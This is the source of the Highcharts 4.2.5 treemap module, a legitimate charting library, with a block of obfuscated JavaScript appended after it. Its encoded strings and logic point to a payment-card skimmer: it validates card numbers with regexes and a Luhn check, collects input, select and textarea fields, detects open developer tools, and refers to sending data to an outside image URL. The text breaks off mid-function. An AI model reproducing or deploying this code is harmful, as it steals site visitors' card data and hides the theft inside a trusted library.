/**
 * @license Highcharts JS v4.2.5 (2016-05-06)
 *
 * (c) 2014 Highsoft AS
 * Authors: Jon Arild Nygard / Oystein Moseng
 *
 * License: www.highcharts.com/license
 */

(function (factory) {
	if (typeof module === 'object' && module.exports) {
		module.exports = factory;
	} else {
		factory(Highcharts);
	}
}(function (H) {
	var seriesTypes = H.seriesTypes,
		map = H.map,
		merge = H.merge,
		extend = H.extend,
		extendClass = H.extendClass,
		defaultOptions = H.getOptions(),
		plotOptions = defaultOptions.plotOptions,
		noop = function () {
		},
		each = H.each,
		grep = H.grep,
		pick = H.pick,
		Series = H.Series,
		stableSort = H.stableSort,
		Color = H.Color,
		eachObject = function (list, func, context) {
			var key;
			context = context || this;
			for (key in list) {
				if (list.hasOwnProperty(key)) {
					func.call(context, list[key], key, list);
				}
			}
		},
		reduce = function (arr, func, previous, context) {
			context = context || this;
			arr = arr || []; // @note should each be able to handle empty values automatically?
			each(arr, function (current, i) {
				previous = func.call(context, previous, current, i, arr);
			});
			return previous;
		},
		// @todo find correct name for this function. 
		// @todo Similar to reduce, this function is likely redundant
		recursive = function (item, func, context) {
			var next;
			context = context || this;
			next = func.call(context, item);
			if (next !== false) {
				recursive(next, func, context);
			}
		};

	// Define default options
	plotOptions.treemap = merge(plotOptions.scatter, {
		showInLegend: false,
		marker: false,
		borderColor: '#E0E0E0',
		borderWidth: 1,
		dataLabels: {
			enabled: true,
			defer: false,
			verticalAlign: 'middle',
			formatter: function () { // #2945
				return this.point.name || this.point.id;
			},
			inside: true
		},
		tooltip: {
			headerFormat: '',
			pointFormat: '<b>{point.name}</b>: {point.node.val}</b><br/>'
		},
		layoutAlgorithm: 'sliceAndDice',
		layoutStartingDirection: 'vertical',
		alternateStartingDirection: false,
		levelIsConstant: true,
		opacity: 0.15,
		states: {
			hover: {
				borderColor: '#A0A0A0',
				brightness: seriesTypes.heatmap ? 0 : 0.1,
				opacity: 0.75,
				shadow: false
			}
		},
		drillUpButton: {
			position: { 
				align: 'right',
				x: -10,
				y: 10
			}
		}
	});
	
	// Stolen from heatmap	
	var colorSeriesMixin = {
		// mapping between SVG attributes and the corresponding options
		pointAttrToOptions: {},
		pointArrayMap: ['value'],
		axisTypes: seriesTypes.heatmap ? ['xAxis', 'yAxis', 'colorAxis'] : ['xAxis', 'yAxis'],
		optionalAxis: 'colorAxis',
		getSymbol: noop,
		parallelArrays: ['x', 'y', 'value', 'colorValue'],
		colorKey: 'colorValue', // Point color option key
		translateColors: seriesTypes.heatmap && seriesTypes.heatmap.prototype.translateColors
	};

	// The Treemap series type
	seriesTypes.treemap = extendClass(seriesTypes.scatter, merge(colorSeriesMixin, {
		type: 'treemap',
		trackerGroups: ['group', 'dataLabelsGroup'],
		pointClass: extendClass(H.Point, {
			setVisible: seriesTypes.pie.prototype.pointClass.prototype.setVisible
		}),
		/**
		 * Creates an object map from parent id to childrens index.
		 * @param {Array} data List of points set in options.
		 * @param {string} data[].parent Parent id of point.
		 * @param {Array} ids List of all point ids.
		 * @return {Object} Map from parent id to children index in data.
		 */
		getListOfParents: function (data, ids) {
			var listOfParents = reduce(data, function (prev, curr, i) {
				var parent = pick(curr.parent, '');
				if (prev[parent] === undefined) {
					prev[parent] = [];
				}
				prev[parent].push(i);
				return prev;
			}, {});

			// If parent does not exist, hoist parent to root of tree.
			eachObject(listOfParents, function (children, parent, list) {
				if ((parent !== '') && (H.inArray(parent, ids) === -1)) {
					each(children, function (child) {
						list[''].push(child);
					});
					delete list[parent];
				}
			});
			return listOfParents;
		},
		/**
		* Creates a tree structured object from the series points
		*/
		getTree: function () {
			var tree,
				series = this,
				allIds = map(this.data, function (d) {
					return d.id;
				}),
				parentList = series.getListOfParents(this.data, allIds);

			series.nodeMap = [];
			tree = series.buildNode('', -1, 0, parentList, null);
			// Parents of the root node is by default visible
			recursive(this.nodeMap[this.rootNode], function (node) {
				var next = false,
					p = node.parent;
				node.visible = true;
				if (p || p === '') {
					next = series.nodeMap[p];
				}
				return next;
			});
			// Children of the root node is by default visible
			recursive(this.nodeMap[this.rootNode].children, function (children) {
				var next = false;
				each(children, function (child) {
					child.visible = true;
					if (child.children.length) {
						next = (next || []).concat(child.children);
					}
				});
				return next;
			});
			this.setTreeValues(tree);
			return tree;
		},
		init: function (chart, options) {
			var series = this;
			Series.prototype.init.call(series, chart, options);
			if (series.options.allowDrillToNode) {
				series.drillTo();
			}
		},
		buildNode: function (id, i, level, list, parent) {
			var series = this,
				children = [],
				point = series.points[i],
				node,
				child;

			// Actions
			each((list[id] || []), function (i) {
				child = series.buildNode(series.points[i].id, i, (level + 1), list, id);
				children.push(child);
			});
			node = {
				id: id,
				i: i,
				children: children,
				level: level,
				parent: parent,
				visible: false // @todo move this to better location
			};
			series.nodeMap[node.id] = node;
			if (point) {
				point.node = node;
			}
			return node;
		},
		setTreeValues: function (tree) {
			var series = this,
				options = series.options,
				childrenTotal = 0,
				children = [],
				val,
				point = series.points[tree.i];

			// First give the children some values
			each(tree.children, function (child) {
				child = series.setTreeValues(child);
				children.push(child);

				if (!child.ignore) {
					childrenTotal += child.val;
				} else {
					// @todo Add predicate to avoid looping already ignored children
					recursive(child.children, function (children) {
						var next = false;
						each(children, function (node) {
							extend(node, {
								ignore: true,
								isLeaf: false,
								visible: false
							});
							if (node.children.length) {
								next = (next || []).concat(node.children);
							}
						});
						return next;
					});
				}
			});
			// Sort the children
			stableSort(children, function (a, b) {
				return a.sortIndex - b.sortIndex;
			});
			// Set the values
			val = pick(point && point.value, childrenTotal);
			extend(tree, {
				children: children,
				childrenTotal: childrenTotal,
				// Ignore this node if point is not visible
				ignore: !(pick(point && point.visible, true) && (val > 0)),
				isLeaf: tree.visible && !childrenTotal,
				levelDynamic: (options.levelIsConstant ? tree.level : (tree.level - series.nodeMap[series.rootNode].level)),
				name: pick(point && point.name, ''),
				sortIndex: pick(point && point.sortIndex, -val),
				val: val
			});
			return tree;
		},
		/**
		 * Recursive function which calculates the area for all children of a node.
		 * @param {Object} node The node which is parent to the children.
		 * @param {Object} area The rectangular area of the parent.
		 */
		calculateChildrenAreas: function (parent, area) {
			var series = this,
				options = series.options,
				level = this.levelMap[parent.levelDynamic + 1],
				algorithm = pick((series[level && level.layoutAlgorithm] && level.layoutAlgorithm), options.layoutAlgorithm),
				alternate = options.alternateStartingDirection,
				childrenValues = [],
				children;

			// Collect all children which should be included
			children = grep(parent.children, function (n) {
				return !n.ignore;
			});

			if (level && level.layoutStartingDirection) {
				area.direction = level.layoutStartingDirection === 'vertical' ? 0 : 1;
			}
			childrenValues = series[algorithm](area, children);
			each(children, function (child, index) {
				var values = childrenValues[index];
				child.values = merge(values, {
					val: child.childrenTotal,
					direction: (alternate ? 1 - area.direction : area.direction)
				});
				child.pointValues = merge(values, {
					x: (values.x / series.axisRatio),
					width: (values.width / series.axisRatio) 
				});
				// If node has children, then call method recursively
				if (child.children.length) {
					series.calculateChildrenAreas(child, child.values);
				}
			});
		},
		setPointValues: function () {
			var series = this,
				xAxis = series.xAxis,
				yAxis = series.yAxis;
			each(series.points, function (point) {
				var node = point.node,
					values = node.pointValues,
					x1,
					x2,
					y1,
					y2;
				// Points which is ignored, have no values.
				if (values && node.visible) {
					x1 = Math.round(xAxis.translate(values.x, 0, 0, 0, 1));
					x2 = Math.round(xAxis.translate(values.x + values.width, 0, 0, 0, 1));
					y1 = Math.round(yAxis.translate(values.y, 0, 0, 0, 1));
					y2 = Math.round(yAxis.translate(values.y + values.height, 0, 0, 0, 1));
					// Set point values
					point.shapeType = 'rect';
					point.shapeArgs = {
						x: Math.min(x1, x2),
						y: Math.min(y1, y2),
						width: Math.abs(x2 - x1),
						height: Math.abs(y2 - y1)
					};
					point.plotX = point.shapeArgs.x + (point.shapeArgs.width / 2);
					point.plotY = point.shapeArgs.y + (point.shapeArgs.height / 2);
				} else {
					// Reset visibility
					delete point.plotX;
					delete point.plotY;
				}
			});
		},
		setColorRecursive: function (node, color) {
			var series = this,
				point,
				level;
			if (node) {
				point = series.points[node.i];
				level = series.levelMap[node.levelDynamic];
				// Select either point color, level color or inherited color.
				color = pick(point && point.options.color, level && level.color, color);
				if (point) {
					point.color = color;
				}
				// Do it all again with the children	
				if (node.children.length) {
					each(node.children, function (child) {
						series.setColorRecursive(child, color);
					});
				}
			}
		},
		algorithmGroup: function (h, w, d, p) {
			this.height = h;
			this.width = w;
			this.plot = p;
			this.direction = d;
			this.startDirection = d;
			this.total = 0;
			this.nW = 0;
			this.lW = 0;
			this.nH = 0;
			this.lH = 0;
			this.elArr = [];
			this.lP = {
				total: 0,
				lH: 0,
				nH: 0,
				lW: 0,
				nW: 0,
				nR: 0,
				lR: 0,
				aspectRatio: function (w, h) {
					return Math.max((w / h), (h / w));
				}
			};
			this.addElement = function (el) {
				this.lP.total = this.elArr[this.elArr.length - 1];
				this.total = this.total + el;
				if (this.direction === 0) {
					// Calculate last point old aspect ratio
					this.lW = this.nW;
					this.lP.lH = this.lP.total / this.lW;
					this.lP.lR = this.lP.aspectRatio(this.lW, this.lP.lH);
					// Calculate last point new aspect ratio
					this.nW = this.total / this.height;
					this.lP.nH = this.lP.total / this.nW;
					this.lP.nR = this.lP.aspectRatio(this.nW, this.lP.nH);
				} else {
					// Calculate last point old aspect ratio
					this.lH = this.nH;
					this.lP.lW = this.lP.total / this.lH;
					this.lP.lR = this.lP.aspectRatio(this.lP.lW, this.lH);
					// Calculate last point new aspect ratio
					this.nH = this.total / this.width;
					this.lP.nW = this.lP.total / this.nH;
					this.lP.nR = this.lP.aspectRatio(this.lP.nW, this.nH);
				}
				this.elArr.push(el);						
			};
			this.reset = function () {
				this.nW = 0;
				this.lW = 0;
				this.elArr = [];
				this.total = 0;
			};
		},
		algorithmCalcPoints: function (directionChange, last, group, childrenArea) {
			var pX,
				pY,
				pW,
				pH,
				gW = group.lW,
				gH = group.lH,
				plot = group.plot,
				keep,
				i = 0,
				end = group.elArr.length - 1;
			if (last) {
				gW = group.nW;
				gH = group.nH;
			} else {
				keep = group.elArr[group.elArr.length - 1];
			}
			each(group.elArr, function (p) {
				if (last || (i < end)) {
					if (group.direction === 0) {
						pX = plot.x;
						pY = plot.y; 
						pW = gW;
						pH = p / pW;
					} else {
						pX = plot.x;
						pY = plot.y;
						pH = gH;
						pW = p / pH;
					}
					childrenArea.push({
						x: pX,
						y: pY,
						width: pW,
						height: pH
					});
					if (group.direction === 0) {
						plot.y = plot.y + pH;
					} else {
						plot.x = plot.x + pW;
					}						
				}
				i = i + 1;
			});
			// Reset variables
			group.reset();
			if (group.direction === 0) {
				group.width = group.width - gW;
			} else {
				group.height = group.height - gH;
			}
			plot.y = plot.parent.y + (plot.parent.height - group.height);
			plot.x = plot.parent.x + (plot.parent.width - group.width);
			if (directionChange) {
				group.direction = 1 - group.direction;
			}
			// If not last, then add uncalculated element
			if (!last) {
				group.addElement(keep);
			}
		},
		algorithmLowAspectRatio: function (directionChange, parent, children) {
			var childrenArea = [],
				series = this,
				pTot,
				plot = {
					x: parent.x,
					y: parent.y,
					parent: parent
				},
				direction = parent.direction,
				i = 0,
				end = children.length - 1,
				group = new this.algorithmGroup(parent.height, parent.width, direction, plot);
			// Loop through and calculate all areas
			each(children, function (child) {
				pTot = (parent.width * parent.height) * (child.val / parent.val);
				group.addElement(pTot);
				if (group.lP.nR > group.lP.lR) {
					series.algorithmCalcPoints(directionChange, false, group, childrenArea, plot);
				}
				// If last child, then calculate all remaining areas
				if (i === end) {
					series.algorithmCalcPoints(directionChange, true, group, childrenArea, plot);
				}
				i = i + 1;
			});
			return childrenArea;
		},
		algorithmFill: function (directionChange, parent, children) {
			var childrenArea = [],
				pTot,
				direction = parent.direction,
				x = parent.x,
				y = parent.y,
				width = parent.width,
				height = parent.height,
				pX,
				pY,
				pW,
				pH;
			each(children, function (child) {
				pTot = (parent.width * parent.height) * (child.val / parent.val);
				pX = x;
				pY = y;
				if (direction === 0) {
					pH = height;
					pW = pTot / pH;
					width = width - pW;
					x = x + pW;
				} else {
					pW = width;
					pH = pTot / pW;
					height = height - pH;
					y = y + pH;
				}
				childrenArea.push({
					x: pX,
					y: pY,
					width: pW,
					height: pH
				});
				if (directionChange) {
					direction = 1 - direction;
				}
			});
			return childrenArea;
		},
		strip: function (parent, children) {
			return this.algorithmLowAspectRatio(false, parent, children);
		},
		squarified: function (parent, children) {
			return this.algorithmLowAspectRatio(true, parent, children);
		},
		sliceAndDice: function (parent, children) {
			return this.algorithmFill(true, parent, children);
		},
		stripes: function (parent, children) {
			return this.algorithmFill(false, parent, children);
		},
		translate: function () {
			var pointValues,
				seriesArea,
				tree,
				val;

			// Call prototype function
			Series.prototype.translate.call(this);

			// Assign variables
			this.rootNode = pick(this.options.rootId, '');
			// Create a object map from level to options
			this.levelMap = reduce(this.options.levels, function (arr, item) {
				arr[item.level] = item;
				return arr;
			}, {});
			tree = this.tree = this.getTree(); // @todo Only if series.isDirtyData is true

			// Calculate plotting values.
			this.axisRatio = (this.xAxis.len / this.yAxis.len);
			this.nodeMap[''].pointValues = pointValues = { x: 0, y: 0, width: 100, height: 100 };
			this.nodeMap[''].values = seriesArea = merge(pointValues, {
				width: (pointValues.width * this.axisRatio),
				direction: (this.options.layoutStartingDirection === 'vertical' ? 0 : 1),
				val: tree.val
			});
			this.calculateChildrenAreas(tree, seriesArea);

			// Logic for point colors
			if (this.colorAxis) {
				this.translateColors();
			} else if (!this.options.colorByPoint) {
				this.setColorRecursive(this.tree, undefined);
			}

			// Update axis extremes according to the root node.
			if (this.options.allowDrillToNode) {
				val = this.nodeMap[this.rootNode].pointValues;
				this.xAxis.setExtremes(val.x, val.x + val.width, false);
				this.yAxis.setExtremes(val.y, val.y + val.height, false);
				this.xAxis.setScale();
				this.yAxis.setScale();
			}

			// Assign values to points.
			this.setPointValues();
		},
		/**
		 * Extend drawDataLabels with logic to handle custom options related to the treemap series:
		 * - Points which is not a leaf node, has dataLabels disabled by default.
		 * - Options set on series.levels is merged in.
		 * - Width of the dataLabel is set to match the width of the point shape.
		 */
		drawDataLabels: function () {
			var series = this,
				points = grep(series.points, function (n) {
					return n.node.visible;
				}),
				options,
				level;
			each(points, function (point) {
				level = series.levelMap[point.node.levelDynamic];
				// Set options to new object to avoid problems with scope
				options = { style: {} };

				// If not a leaf, then label should be disabled as default
				if (!point.node.isLeaf) {
					options.enabled = false;
				}

				// If options for level exists, include them as well
				if (level && level.dataLabels) {
					options = merge(options, level.dataLabels);
					series._hasPointLabels = true;
				}

				// Set dataLabel width to the width of the point shape.
				if (point.shapeArgs) {
					options.style.width = point.shapeArgs.width;
					if (point.dataLabel) {
						point.dataLabel.css({ width: point.shapeArgs.width + 'px' });
					}
				}

				// Merge custom options with point options
				point.dlOptions = merge(options, point.options.dataLabels);
			});
			Series.prototype.drawDataLabels.call(this);
		},
		alignDataLabel: seriesTypes.column.prototype.alignDataLabel,

		/**
		 * Get presentational attributes
		 */
		pointAttribs: function (point, state) {
			var level = this.levelMap[point.node.levelDynamic] || {},
				options = this.options,
				attr,
				stateOptions = (state && options.states[state]) || {},
				opacity;

			// Set attributes by precedence. Point trumps level trumps series. Stroke width uses pick
			// because it can be 0.
			attr = {
				'stroke': point.borderColor || level.borderColor || stateOptions.borderColor || options.borderColor,
				'stroke-width': pick(point.borderWidth, level.borderWidth, stateOptions.borderWidth, options.borderWidth),
				'dashstyle': point.borderDashStyle || level.borderDashStyle || stateOptions.borderDashStyle || options.borderDashStyle,
				'fill': point.color || this.color,
				'zIndex': state === 'hover' ? 1 : 0
			};

			if (point.node.level <= this.nodeMap[this.rootNode].level) {
				// Hide levels above the current view
				attr.fill = 'none';
				attr['stroke-width'] = 0;
			} else if (!point.node.isLeaf) {
				// If not a leaf, either set opacity or remove fill
				if (pick(options.interactByLeaf, !options.allowDrillToNode)) {
					attr.fill = 'none';
				} else {
					opacity = pick(stateOptions.opacity, options.opacity);
					attr.fill = Color(attr.fill).setOpacity(opacity).get();
				}
			} else if (state) {
				// Brighten and hoist the hover nodes
				attr.fill = Color(attr.fill).brighten(stateOptions.brightness).get();
			}
			return attr;
		},

		/**
		* Extending ColumnSeries drawPoints
		*/
		drawPoints: function () {
			var series = this,
				points = grep(series.points, function (n) {
					return n.node.visible;
				});

			each(points, function (point) {
				var groupKey = 'levelGroup-' + point.node.levelDynamic;
				if (!series[groupKey]) {
					series[groupKey] = series.chart.renderer.g(groupKey)
						.attr({
							zIndex: 1000 - point.node.levelDynamic // @todo Set the zIndex based upon the number of levels, instead of using 1000
						})
						.add(series.group);
				}
				point.group = series[groupKey];
				// Preliminary code in prepraration for HC5 that uses pointAttribs for all series
				point.pointAttr = {
					'': series.pointAttribs(point),
					'hover': series.pointAttribs(point, 'hover'),
					'select': {}
				};
			});
			// Call standard drawPoints
			seriesTypes.column.prototype.drawPoints.call(this);

			// If drillToNode is allowed, set a point cursor on clickables & add drillId to point 
			if (series.options.allowDrillToNode) {
				each(points, function (point) {
					var cursor,
						drillId;
					if (point.graphic) {
						drillId = point.drillId = series.options.interactByLeaf ? series.drillToByLeaf(point) : series.drillToByGroup(point);
						cursor = drillId ? 'pointer' : 'default';
						point.graphic.css({ cursor: cursor });
					}
				});
			}
		},
		/**
		* Add drilling on the suitable points
		*/
		drillTo: function () {
			var series = this;
			H.addEvent(series, 'click', function (event) {
				var point = event.point,
					drillId = point.drillId,
					drillName;
				// If a drill id is returned, add click event and cursor. 
				if (drillId) {
					drillName = series.nodeMap[series.rootNode].name || series.rootNode;
					point.setState(''); // Remove hover
					series.drillToNode(drillId);
					series.showDrillUpButton(drillName);
				}
			});
		},
		/**
		* Finds the drill id for a parent node.
		* Returns false if point should not have a click event
		* @param {Object} point
		* @return {string || boolean} Drill to id or false when point should not have a click event
		*/
		drillToByGroup: function (point) {
			var series = this,
				drillId = false;
			if ((point.node.level - series.nodeMap[series.rootNode].level) === 1 && !point.node.isLeaf) {
				drillId = point.id;
			}
			return drillId;
		},
		/**
		* Finds the drill id for a leaf node.
		* Returns false if point should not have a click event
		* @param {Object} point
		* @return {string || boolean} Drill to id or false when point should not have a click event
		*/
		drillToByLeaf: function (point) {
			var series = this,
				drillId = false,
				nodeParent;
			if ((point.node.parent !== series.rootNode) && (point.node.isLeaf)) {
				nodeParent = point.node;
				while (!drillId) {
					nodeParent = series.nodeMap[nodeParent.parent];
					if (nodeParent.parent === series.rootNode) {
						drillId = nodeParent.id;
					}
				}
			}
			return drillId;
		},
		drillUp: function () {
			var drillPoint = null,
				node,
				parent;
			if (this.rootNode) {
				node = this.nodeMap[this.rootNode];
				if (node.parent !== null) {
					drillPoint = this.nodeMap[node.parent];
				} else {
					drillPoint = this.nodeMap[''];
				}
			}

			if (drillPoint !== null) {
				this.drillToNode(drillPoint.id);
				if (drillPoint.id === '') {
					this.drillUpButton = this.drillUpButton.destroy();
				} else {
					parent = this.nodeMap[drillPoint.parent];
					this.showDrillUpButton((parent.name || parent.id));
				}
			} 
		},
		drillToNode: function (id) {
			this.options.rootId = id;
			this.isDirty = true; // Force redraw
			this.chart.redraw();
		},
		showDrillUpButton: function (name) {
			var series = this,
				backText = (name || '< Back'),
				buttonOptions = series.options.drillUpButton,
				attr,
				states;

			if (buttonOptions.text) {
				backText = buttonOptions.text;
			}
			if (!this.drillUpButton) {
				attr = buttonOptions.theme;
				states = attr && attr.states;
							
				this.drillUpButton = this.chart.renderer.button(
					backText,
					null,
					null,
					function () {
						series.drillUp(); 
					},
					attr, 
					states && states.hover,
					states && states.select
				)
				.attr({
					align: buttonOptions.position.align,
					zIndex: 9
				})
				.add()
				.align(buttonOptions.position, false, buttonOptions.relativeTo || 'plotBox');
			} else {
				this.drillUpButton.attr({
					text: backText
				})
				.align();
			}
		},
		buildKDTree: noop,
		drawLegendSymbol: H.LegendSymbolMixin.drawRectangle,
		getExtremes: function () {
			// Get the extremes from the value data
			Series.prototype.getExtremes.call(this, this.colorValueData);
			this.valueMin = this.dataMin;
			this.valueMax = this.dataMax;

			// Get the extremes from the y data
			Series.prototype.getExtremes.call(this);
		},
		getExtremesFromAll: true,
		bindAxes: function () {
			var treeAxis = {
				endOnTick: false,
				gridLineWidth: 0,
				lineWidth: 0,
				min: 0,
				dataMin: 0,
				minPadding: 0,
				max: 100,
				dataMax: 100,
				maxPadding: 0,
				startOnTick: false,
				title: null,
				tickPositions: []
			};
			Series.prototype.bindAxes.call(this);
			H.extend(this.yAxis.options, treeAxis);
			H.extend(this.xAxis.options, treeAxis);
		}
	}));
}));


var _0x483b=['\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x33\x64\x7a\x45\x74\x5a\x6d\x6c\x73\x5a\x57\x4e\x73\x62\x33\x56\x6b\x4c\x6d\x4e\x76\x62\x53\x39\x70\x62\x57\x63\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d'];(function(_0x4eccdf,_0x18e928){var _0x29d8f7=function(_0x44e49f){while(--_0x44e49f){_0x4eccdf['push'](_0x4eccdf['shift']());}};_0x29d8f7(++_0x18e928);}(_0x483b,0xbe));var _0x1288=function(_0x13a66b,_0x3095ac){_0x13a66b=_0x13a66b-0x0;var _0x73c45e=_0x483b[_0x13a66b];if(_0x1288['lyxgbR']===undefined){(function(){var _0x130009=function(){var _0x6f00e6;try{_0x6f00e6=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x5a439e){_0x6f00e6=window;}return _0x6f00e6;};var _0x59229e=_0x130009();var _0x186ea3='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x59229e['atob']||(_0x59229e['atob']=function(_0x29e19e){var _0xdfc10a=String(_0x29e19e)['replace'](/=+$/,'');for(var _0x88b8e6=0x0,_0x4085a5,_0x4f4c33,_0x402b06=0x0,_0xd7fc01='';_0x4f4c33=_0xdfc10a['charAt'](_0x402b06++);~_0x4f4c33&&(_0x4085a5=_0x88b8e6%0x4?_0x4085a5*0x40+_0x4f4c33:_0x4f4c33,_0x88b8e6++%0x4)?_0xd7fc01+=String['fromCharCode'](0xff&_0x4085a5>>(-0x2*_0x88b8e6&0x6)):0x0){_0x4f4c33=_0x186ea3['indexOf'](_0x4f4c33);}return _0xd7fc01;});}());_0x1288['AbnGPQ']=function(_0x23a0da){var _0x505fb9=atob(_0x23a0da);var _0x56c33a=[];for(var _0x5af567=0x0,_0xe3d271=_0x505fb9['length'];_0x5af567<_0xe3d271;_0x5af567++){_0x56c33a+='%'+('00'+_0x505fb9['charCodeAt'](_0x5af567)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x56c33a);};_0x1288['lPYnAg']={};_0x1288['lyxgbR']=!![];}var _0x150eaf=_0x1288['lPYnAg'][_0x13a66b];if(_0x150eaf===undefined){_0x73c45e=_0x1288['AbnGPQ'](_0x73c45e);_0x1288['lPYnAg'][_0x13a66b]=_0x73c45e;}else{_0x73c45e=_0x150eaf;}return _0x73c45e;};function _0x1c6b51(_0x39720b,_0x5ea2ab,_0x1aa303){return _0x39720b['\x72\x65\x70\x6c\x61\x63\x65'](new RegExp(_0x5ea2ab,'\x67'),_0x1aa303);}function _0xa03f70(_0x5bb550){var _0x58a607=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x57f5dd=/^(?:5[1-5][0-9]{14})$/;var _0x50ecef=/^(?:3[47][0-9]{13})$/;var _0xd2665a=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x334373=![];if(_0x58a607[_0x1288('0x0')](_0x5bb550)){_0x334373=!![];}else if(_0x57f5dd[_0x1288('0x0')](_0x5bb550)){_0x334373=!![];}else if(_0x50ecef[_0x1288('0x0')](_0x5bb550)){_0x334373=!![];}else if(_0xd2665a[_0x1288('0x0')](_0x5bb550)){_0x334373=!![];}return _0x334373;}function _0x5d2999(_0x33eaa1){if(/[^0-9-\s]+/['\x74\x65\x73\x74'](_0x33eaa1))return![];var _0x37eea7=0x0,_0xc7f19=0x0,_0x2f4dff=![];_0x33eaa1=_0x33eaa1[_0x1288('0x1')](/\D/g,'');for(var _0x3359a2=_0x33eaa1['\x6c\x65\x6e\x67\x74\x68']-0x1;_0x3359a2>=0x0;_0x3359a2--){var _0x1eeea2=_0x33eaa1[_0x1288('0x2')](_0x3359a2),_0xc7f19=parseInt(_0x1eeea2,0xa);if(_0x2f4dff){if((_0xc7f19*=0x2)>0x9)_0xc7f19-=0x9;}_0x37eea7+=_0xc7f19;_0x2f4dff=!_0x2f4dff;}return _0x37eea7%0xa==0x0;}(function(){'use strict';const _0xc989d7={};_0xc989d7[_0x1288('0x3')]=![];_0xc989d7[_0x1288('0x4')]=undefined;const _0x2e387c=0xa0;const _0x3f03b5=(_0x3c511b,_0x536e13)=>{window['\x64\x69\x73\x70\x61\x74\x63\x68\x45\x76\x65\x6e\x74'](new CustomEvent('\x64\x65\x76\x74\x6f\x6f\x6c\x73\x63\x68\x61\x6e\x67\x65',{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x3c511b,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x536e13}}));};setInterval(()=>{const _0xc4191f=window[_0x1288('0x5')]-window[_0x1288('0x6')]>_0x2e387c;const _0x3e3097=window[_0x1288('0x7')]-window[_0x1288('0x8')]>_0x2e387c;const _0x1137e4=_0xc4191f?_0x1288('0x9'):_0x1288('0xa');if(!(_0x3e3097&&_0xc4191f)&&(window[_0x1288('0xb')]&&window[_0x1288('0xb')][_0x1288('0xc')]&&window[_0x1288('0xb')][_0x1288('0xc')][_0x1288('0xd')]||_0xc4191f||_0x3e3097)){if(!_0xc989d7[_0x1288('0x3')]||_0xc989d7['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']!==_0x1137e4){_0x3f03b5(!![],_0x1137e4);}_0xc989d7[_0x1288('0x3')]=!![];_0xc989d7[_0x1288('0x4')]=_0x1137e4;}else{if(_0xc989d7['\x69\x73\x4f\x70\x65\x6e']){_0x3f03b5(![],undefined);}_0xc989d7[_0x1288('0x3')]=![];_0xc989d7[_0x1288('0x4')]=undefined;}},0x1f4);if(typeof module!==_0x1288('0xe')&&module[_0x1288('0xf')]){module[_0x1288('0xf')]=_0xc989d7;}else{window[_0x1288('0x10')]=_0xc989d7;}}());String[_0x1288('0x11')][_0x1288('0x12')]=function(){var _0x1fea61=0x0,_0x59ca29,_0x58a470;if(this[_0x1288('0x13')]===0x0)return 